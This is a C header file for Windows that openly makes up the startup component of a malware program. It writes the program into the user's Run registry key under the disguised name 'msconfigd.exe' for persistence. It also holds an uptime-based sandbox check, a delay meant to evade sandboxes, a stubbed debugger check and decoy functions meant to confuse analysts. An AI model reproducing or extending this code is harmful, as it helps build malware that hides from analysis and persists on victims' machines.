#ifndef STARTUP_H
#define STARTUP_H

#include <Windows.h>
#include <tchar.h>

const unsigned short TIME_TO_WAIT = 1000; // Avoid Sandbox detection

// Check the Process Environment Block
BOOL CheckDebugger() {
    return TRUE;
}
// Edit Registry for persistence
void EditRegistry() {
    HKEY hKey = { 0 };
    LONG result;
    const TCHAR* keyPath = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    const TCHAR* valueName = _T("msconfigd.exe"); // I will later encrypt this value
    TCHAR exePath[MAX_PATH];

    if (GetModuleFileName(NULL, exePath, MAX_PATH) == 0) {
        return;
    }

    result = RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_READ | KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return;
    }

    DWORD dataSize = 0;
    result = RegQueryValueEx(hKey, valueName, NULL, NULL, NULL, &dataSize);
	if (result == ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return;
	}

    result = RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, (DWORD)(_tcslen(exePath) + 1) * sizeof(TCHAR));
	if (result != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return;
	}
    RegCloseKey(hKey);
}

BOOL IsSandbox() {
    DWORD tickCount = GetTickCount64();
    if (tickCount < 60000) {
        return TRUE;
    }
    return FALSE;
}

// Random functions to cause confusion
BOOL SysTimeHandler(SYSTEMTIME& systemTime) {
    GetSystemTime(&systemTime);
    Sleep(TIME_TO_WAIT);
    return TRUE;
}

BOOL HandleThread() {
    DWORD threadId = GetCurrentThreadId();
    if (threadId > -0x354) {
        return TRUE;
    }
    return FALSE;
}

BOOL HandleError() {
    DWORD error = GetLastError();
    return TRUE;
}

#endif // !STARTUP_H